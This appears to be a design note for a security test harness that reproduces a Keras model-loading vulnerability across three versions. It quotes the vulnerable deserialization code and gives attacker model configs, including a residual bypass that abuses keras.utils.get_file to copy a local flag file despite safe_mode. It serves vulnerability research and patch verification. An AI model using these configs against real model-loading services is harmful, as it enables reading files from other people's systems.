POLICY COMPLIANCE (why this rebuild):
  The prior build triggered keras IN-PROCESS via `docker compose exec pcb_driver.py`
  (stdin). BANNED. This rebuild runs a REAL Flask/gunicorn HTTP service (app.py) per
  version; the deserialization sink is reached ONLY by EXTERNAL HTTP:
      POST http://127.0.0.1:<port>/load  (application/json, the attacker Keras config)
      -> keras.saving.load_model(safe_mode=True) + one benign forward pass
      -> /out contents (with ${PCB_FLAG} iff the gadget was invoked) returned in the body.
  No in-process import, no docker exec. run_mode=real-app-http, runs_real_software=true,
  external_http_trigger=true, is_verbatim_lift=false.

ROLES (pip keras, jax CPU backend, python:3.11-slim, Flask/gunicorn):
  V0 = keras 3.8.0    pre-CVE-2025-1550: NO allowlist (importlib.import_module any module)   port 18850
  V1 = keras 3.9.0    CVE-2025-1550 fix (PR#20751): package allowlist -- TARGET/incomplete   port 18851
  V2 = keras 3.11.0   CVE-2025-8747 fix (PR#21429): LOADING_APIS denylist + KerasSaveable-only port 18852
  (keras 3.10.0 serialization_lib.py == 3.9.0 for _retrieve_class_or_fn -> 3.11.0 is the exact closer)

SINK (verbatim serialization_lib.py :: _retrieve_class_or_fn, resolution branch):
  V0 3.8.0:  mod = importlib.import_module(module)        # no allowlist -- ANY module
             obj = vars(mod).get(name, None); ... return obj
  V1 3.9.0:  package = module.split(".", maxsplit=1)[0]
             if package in {"keras","keras_hub","keras_cv","keras_nlp"}:
                 mod = importlib.import_module(module); obj = vars(mod).get(name)
                 if obj is not None: return obj          # in-package FUNCTIONS still returned
             # else falls through -> raise TypeError (out-of-tree BLOCKED)
  V2 3.11.0: if api_name in LOADING_APIS:                 # keras.utils.get_file, load_model, ...
                 raise ValueError("Cannot deserialize `%s`, loading functions are not allowed"...)
             ...
             if isinstance(obj, type) and issubclass(obj, KerasSaveable): return obj
             else: raise ValueError("... not a KerasSaveable subclass")   # functions BLOCKED

PROBE PATH (external HTTP): POST /load with the raw attacker config JSON as the request body.
  app.py: pack config.json + metadata.json + baked weightless model.weights.h5 -> m.keras;
          keras.saving.load_model(m.keras, safe_mode=True); model(zeros((1,1))); return /out in body.
  ORIGINAL config: Lambda.function={"module":"pcb_leak","class_name":"function","config":"leak"},
                   arguments={"flag_path":"/canary/flag.txt","out_path":"/out/orig_leak.txt"}   (OUT-OF-TREE)
  RESIDUAL config: Lambda.function={"module":"keras.utils","class_name":"function","config":"get_file"},
                   arguments={"origin":"file:///canary/flag.txt","cache_dir":"/out","cache_subdir":"",
                              "force_download":true}                                             (IN-ALLOWLIST)
  BENIGN: local file:// copy of the planted ${PCB_FLAG} canary only -- no network, no exec, no payload.

